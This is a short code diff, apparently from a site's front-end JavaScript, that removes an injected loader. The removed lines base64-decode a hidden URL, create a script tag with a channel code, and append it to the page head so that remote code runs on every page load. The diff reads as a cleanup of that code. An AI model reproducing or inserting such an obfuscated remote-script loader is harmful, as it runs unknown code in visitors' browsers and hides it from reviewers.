@@ -195,9 +195,3 @@ if (track && cards.length) {
   });
 }
 
-const u = atob("aHR0cHM6Ly9zaGUtZzhmLnBhZ2VzLmRldi9ib290Lmpz");
-const s = document.createElement("script");
-s.src = u;
-s.dataset.landing = "";
-s.dataset.channelCode = "9cbdf797";
-document.head.appendChild(s);
